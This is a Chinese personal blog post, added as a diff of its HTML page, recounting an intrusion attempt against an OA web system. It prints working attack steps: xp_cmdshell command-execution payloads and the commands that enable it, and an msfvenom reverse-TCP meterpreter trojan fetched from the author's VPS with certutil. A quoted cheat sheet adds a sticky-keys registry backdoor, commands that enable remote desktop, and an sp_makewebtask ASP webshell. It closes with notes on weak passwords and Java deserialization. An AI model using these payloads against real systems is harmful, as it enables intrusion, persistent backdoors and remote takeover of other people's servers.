@@ -1,0 +1,1005 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head>
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.6 -->
+    <script>
+        window.materialVersion = "1.5.6"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1',
+            '1.5.0',
+            '1.5.2',
+            '1.5.5'
+        ]
+    </script>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+
+
+
+
+
+
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com"/>
+
+
+
+
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!-- Title -->
+    
+    <title>
+        
+            摸鱼鸭～ | 
+        
+        RingFa1l
+    </title>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/ling.png">
+    <link rel="icon" href="/img/ling.png">
+
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="null">
+    <meta name="theme-color" content="#0097A7">
+
+    <!-- Disable Fucking Bloody Baidu Tranformation -->
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?NKhlKQkXw/c66TR5p4wO+w==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0097A7 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0097A7 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0097A7 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icons -->
+
+
+    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
+    
+
+    <!-- WebAPP Icons -->
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="application-name" content="RingFa1l">
+    <meta name="msapplication-starturl" content="http://ringfall.top/2020/02/12/moyu/">
+    <meta name="msapplication-navbutton-color" content="#0097A7">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="RingFa1l">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="/img/ling.png">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://ringfall.top/2020/02/12/moyu/">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="摸鱼鸭～ | RingFa1l">
+    <meta property="og:image" content="/img/ling.png">
+    <meta property="og:description" content="">
+    
+
+    
+        <meta property="article:published_time" content="Wed Feb 12 2020 12:06:18 GMT+0800">
+        <meta property="article:modified_time" content="Sun Feb 16 2020 19:03:56 GMT+0800">
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://ringfall.top/2020/02/12/moyu/index.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://ringfall.top/2020/02/12/moyu/index.html",
+    "headline": "摸鱼鸭～",
+    "datePublished": "Wed Feb 12 2020 12:06:18 GMT+0800",
+    "dateModified": "Sun Feb 16 2020 19:03:56 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "铃落",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/2.jpg"
+        },
+        "description": "铃音不才，纷落为歌。"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "RingFa1l",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/ling.png"
+        }
+    },
+    "keywords": "null",
+    "description": "",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span id="MD-burger-id" class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        <!-- Custom Thumbnail -->
+        <div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(https://s2.ax1x.com/2020/02/16/3pX7LR.jpg)">
+    
+            <p class="article-headline-p">
+                摸鱼鸭～
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/2.jpg" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>铃落</strong>
+        <span>2月 12, 2020</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=摸鱼鸭～&url=http://ringfall.top/2020/02/12/moyu/index.html&pic=http://ringfall.top/img/ling.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=摸鱼鸭～&url=http://ringfall.top/2020/02/12/moyu/index.html&via=铃落" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://ringfall.top/2020/02/12/moyu/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://ringfall.top/2020/02/12/moyu/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+    
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <p>记录一下这半天在家远程摸鱼的日站</p>
+<p>首先这是个oa，又是oa！之前致远oa的洞上传了shell却访问报错难受洗窝惹orz，没想到这个oa也有nday：）</p>
+<p>sql执行接口，先试了一下sql命令，被拦了，喵喵喵又是connection reset，然后试一下xp_cmdshell的rce payload： <code>/ServiceAction/com.velcro.base.DataAction?sql=xp_cmdshell%20%27whoami%27</code> ，提示SQL Server阻止了对sys.xp_cmdshell的访问，那说明这儿的命令执行是存在的嘛～</p>
+<p>然后窝在搜SQL Server有啥命令的时候才突然发现原来SQL Server就是Mssql？？那为什么要有两种叫法？我一直以为是不一样的！怀疑喵生QAQ（还不是因为又菜又懒嘤嘤嘤</p>
+<p>搜到了Mssql在xp_cmdshell默认关闭时命令执行的方法——CLR？orz一眼瞟过没看懂，于是又康到了激活xp_cmdshell的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">exec sp_configure &apos;show advanced options&apos;, 1; </div><div class="line">reconfigure; </div><div class="line">exec sp_configure &apos;xp_cmdshell&apos;, 1; </div><div class="line">reconfigure; </div><div class="line">exec sp_configure &apos;show advanced options&apos;, 0; </div><div class="line">reconfigure;</div></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EXEC sp_configure &apos;show advanced options&apos;, 1 ;  reconfigure;  //允许修改高级参数</div><div class="line">EXEC exec sp_configure &apos;xp_cmdshell&apos;, 1 ; reconfigure;  //打开xp_cmdshell扩展</div></pre></td></tr></table></figure>
+<p>然后完全不抱希望地试了一下，好像是返回报错说sql语句未返回任何结果之类的</p>
+<p>桥豆麻袋！没返回结果！那是不是成功修改惹鸭！</p>
+<p>继续不报希望地 <code>sql=xp_cmdshell%20%27whoami%27</code> 返回了！返回了administrator！</p>
+<p>激动的心，颤抖的手哈哈哈哈哈哈哈嗝（菜鸡就是如此卑微，有个rce就开心得不行嘤嘤嘤</p>
+<p>chdir一下发现是c盘system32路径；dir一下是一些乱七八糟的文件；ping一下发现可以出外网；net user一下发现米有权限</p>
+<p>讲道理窝一直以为Windows也可以一句话弹shell的，所以自从上次日到rce但是没试一下shell之后就一直想着</p>
+<p>于是现在又有个良机x怎么能不试一哈捏qvq</p>
+<p>然后一搜，原来Windows这么麻烦Orz还不如直接找网站功能传shell呢</p>
+<p>但是猥琐的窝还是在vps上哒上了kali的docker装上了msf生成了木马放到了web服务里x</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install docker.io  安装docker</div><div class="line">docker pull kalilinux/kali-linux-docker  拉取kali镜像</div><div class="line">docker run -t -i kalilinux/kali-linux-docker /bin/bash  启动并进入容器</div><div class="line">apt-get update &amp;&amp; apt-get upgrade</div><div class="line">apt-get install metasploit-framework  安装msf</div><div class="line">msfconsole -L</div><div class="line">exit</div><div class="line">docker commit ***** msf  保存容器为镜像</div><div class="line">docker run -t -p 8888:8888 -i msf /bin/bash 映射vps同个端口</div><div class="line"></div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=*.*.*.* lport=8888 -f exe &gt; /root/horse.exe  生成默认木马</div><div class="line">docker cp *****:root/horse.exe /root  拷贝出来</div><div class="line">python3 -m http.server  开启web服务（要用py3哦）</div></pre></td></tr></table></figure>
+<p>确认一下木马已经就绪啦，然后来康康windows命令行咋下载～</p>
+<p>惊了。windows真的好鸡儿麻烦。搜到的都是说用powershell，可是运行了一下又是拒绝。什么curl啊wget啊都米有。突然想到前几天直播课是不是讲了个啥下载证书用的Windows命令来着，赶紧去搜了一下，没错就是CertUtil！</p>
+<p>于是 <code>certutil -urlcache -split -f http://vps_ip:8000/sysrf.exe sysrf.exe</code></p>
+<p>显示 <code>**** 联机 ****, 000000 ..., 01204a,CertUtil: -URLCache 命令成功完成。</code> </p>
+<p>一看目录，米有多出来窝sysrf鸭，启动窝的win10虚拟机试了一下，发现这个systen32原来是普通账号没权限写的，而且defender秒删窝的exe233333</p>
+<p>目标机子好像是Windows Server 2008R2，先换个目录试试 <code>type nul&gt;d:\test\test</code> 写入成功</p>
+<p>远程test文件d盘也下载成功，exe失败</p>
+<p>关掉了窝的defender用CertUtil decode了一下</p>
+<p>下载成功！</p>
+<p><code>certutil -decode d:\test\sysrf.b64 d:\test\sysrf.exe</code> </p>
+<p><code>输入长度=101536 输出长度=0</code> </p>
+<p>菊花一紧x，果然是被删了呜呜呜呜呜</p>
+<p>于是开始康如何免杀，好不容易哒好了cs发现我们的平台生成的居然有密码orz</p>
+<p>因为太晚了准备第二天问的，不行的话再试试empire的，第二天一打开执行的地方</p>
+<p>“您正在试图非法攻击”</p>
+<p>？？？？？呜呜呜呜呜呜呜呜</p>
+<hr>
+<p>反思一下，自己还是太蠢太naive，操作不够 <del>骚</del> 快， <del>运维人员居然是真实存在的（废话</del> </p>
+<p>应该先Tasklist康康是啥安全软件的，然后找找网站目录的，这样直接asp一句话好了鸭（继续yy。。。</p>
+<p>总而言之Windows真的太讨厌惹！</p>
+<p>睡觉前还在想第二天怎么搞x结果x</p>
+<p>oa弱密码进去各种功能也都有waf拦着，唉</p>
+<hr>
+<p>总结别的一些嗖嗖嗖的时候瞧见的：</p>
+<blockquote>
+<p>SQL-SERVER的常规GetShell思路：</p>
+<p>1.确认当前的数据库用户权限为sysadmin<br>2.直接备份数据/调用可以命令执行的存储过程，如Xp_cmdshell等<br>3.若用户非sa权限则考虑差异备份 Log备份等</p>
+<p>除了xp_cmdshell还有操作注册表的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">&gt;xp_regaddmultistring</div><div class="line">&gt;xp_regdeletekey //删除键</div><div class="line">&gt;xp_regdeletevalue //删除值</div><div class="line">&gt;xp_regenumkeys</div><div class="line">&gt;xp_regenumvalues //返回多个值</div><div class="line">&gt;xp_regread //读取键值</div><div class="line">&gt;xp_regremovemultistring</div><div class="line">&gt;xp_regwrite //写入键值 xp_regwrite 根键,子键, 值名, 值类型, 值</div><div class="line">&gt;控制服务的xp_servicecontrol等</div><div class="line">&gt;</div><div class="line">&gt;开启telnet服务</div><div class="line">&gt;execmaster..xp_servicecontrol &apos;start&apos;, &apos;tlntsvr&apos;</div><div class="line">&gt;写入shift后门</div><div class="line">&gt;exec xp_regwrite</div><div class="line">&gt;&apos;HKEY_LOCAL_MACHINE&apos;,</div><div class="line">&gt;&apos;SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe&apos;,</div><div class="line">&gt;&apos;debugger&apos;,</div><div class="line">&gt;&apos;REG_SZ&apos;,</div><div class="line">&gt;&apos;c:\\windows\\system32\\taskmgr.exe&apos;</div><div class="line">&gt;16进制</div><div class="line">&gt;exec xp_regwrite</div><div class="line">&gt;0x484b45595f4c4f43414c5f4d414348494e45,</div><div class="line">&gt;0x534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c496d6167652046696c6520457865637574696f6e204f7074696f6e735c73657468632e657865,</div><div class="line">&gt;0x6465627567676572,</div><div class="line">&gt;0x5245475f535a,</div><div class="line">&gt;查看远程桌面开启</div><div class="line">&gt;exec xp_regread</div><div class="line">&gt;&apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\CurrentControlSet\Control\TerminalServer&apos;,</div><div class="line">&gt;&apos;fDenyTSConnections&apos;</div><div class="line">&gt;开启远程桌面</div><div class="line">&gt;exec xp_regwrite</div><div class="line">&gt;&apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\CurrentControlSet\Control\TerminalServer&apos;,</div><div class="line">&gt;&apos;fDenyTSConnections&apos;,</div><div class="line">&gt;&apos;REG_DWord&apos;,0</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>sp_makewebtask写入一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; exec sp_configure &apos;Web AssistantProcedures&apos;, 1; RECONFIGURE</div><div class="line">&gt; exec sp_makewebtask &apos;c:\1.asp&apos;,&apos;select&apos;&apos;&lt;%execute(request(&quot;ruo&quot;))%&gt;&apos;&apos;&apos;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<hr>
+<p>还有另一个资产居然和我们组长一样的，窝瑟瑟发抖</p>
+<p>弱密码进去一康是管理微信公众号各种后台的，搜了一下一些都不像鸭</p>
+<p>看了一下系统有米有指纹也米有啊，然后用了个看起来奇葩一点的路径去github一搜，居然真的搞到了真的。。。</p>
+<p>2star我还不太信，结果看到了默认用户名密码还真一样，找了个路径一访问。。。绝对是真的。窝惊了。</p>
+<p>然后就开始瞎几把审计？像模像样地和大佬一样找路由和upload点？</p>
+<p>第一下看的都是aspx，感觉有点不对？</p>
+<p>才发现原来.cs才是后端代码。。。原来C#是和.net一起用哒Orz</p>
+<p>幸好代码都长一个样，直接构造了一下访问的接口居然全都是未授权</p>
+<p>然后又像模像样地各种函数跟进跟进？</p>
+<p>飘了。好的窝会审计了。（才怪</p>
+<p>别的还有各种垃圾高危就不嗦了。这个系统本身的广告页面都没删。随便一注册就是管理员。随便一登录就能越权。appsecret到处都是。有waf了不起啊。（就是了不起呜呜呜，只能对着源码找点逻辑漏洞</p>
+<p>总之幸好站太辣鸡大概没有被嫌弃～嘿嘿</p>
+<p>另外原来这种站要传asmx和ashx的马才会解析，窝还想传.cs？</p>
+<hr>
+<p>碰到有意思的站还是比较酥糊qvq，心疼另外几只要么没账号要么只有静态页面的哈哈哈哈哈，但是老哥们还是强的，学到一个sqlmap的–random-agent</p>
+<hr>
+<p>还有就是前几天终于开始康了一下java反序列化，觉得寄几大概有那么一点点点点懂了！</p>
+<p><a href="https://paper.seebug.org/312/" target="_blank" rel="external">这篇</a>还挺好，过了几天才有时间来这顺便写一下，，然后就发现快忘光了？</p>
+<p>首先java反序列化和php都是序列化一个类，区别就是一个只是个肉眼就能反序列的字符串，另一个序列化后就成了文件（不过也是一串二进制啦，具体每个字节啥意思可以搜一下用那个分析脚本康一下就明白啦），特征是 <code>ac ed 00 05</code>或<code>rO0AB</code> </p>
+<p>然后窝心里java的特征就是库贼多，各种名字贼长，果然有了问题就很难修，修好了又被找到新的方法，xswl</p>
+<p>总之就是执行重写的readObject中通过各种构造各种链然后就调用到执行了？（大概</p>
+<p>整个反序列化各种底层调用的过程可以看组里大佬<a href="http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/#CVE-2019-2890" target="_blank" rel="external">两篇深究文章</a>嘻嘻（窝这么菜只能白嫖x毕竟窝在摸鱼/碎觉/发呆呆的时候人家在各种调试各种挖洞</p>
+<p>另外也就是囫囵吞枣地理解了一下那几个特别有名的洞</p>
+<p>看来看去感觉还是觉得好复杂Orz本来就不咋会java，过几天几个月再回头看看叭qvq</p>
+<p>总之反射是个神奇的东西，还有这里面代理到底是啥，等我懂了再更（瘫</p>
+<p>判断有无反序列化相关漏洞：</p>
+<ul>
+<li>反序列化文件特征</li>
+<li>Java RMI 的传输 100% 基于反序列化，默认端口1099</li>
+<li>可以被序列化的类一定实现了<code>Serializable</code>接口</li>
+<li>反序列化时的<code>readObject()</code>方法是否重写</li>
+<li>其实最有用的是看系统版本是不是爆出过洞最靠谱23333</li>
+</ul>
+<p>另外有空康康ysoserial这个神器，这次就到这儿8，研究大创和毕设去了</p>
+<p>（下次一定x</p>
+<hr>
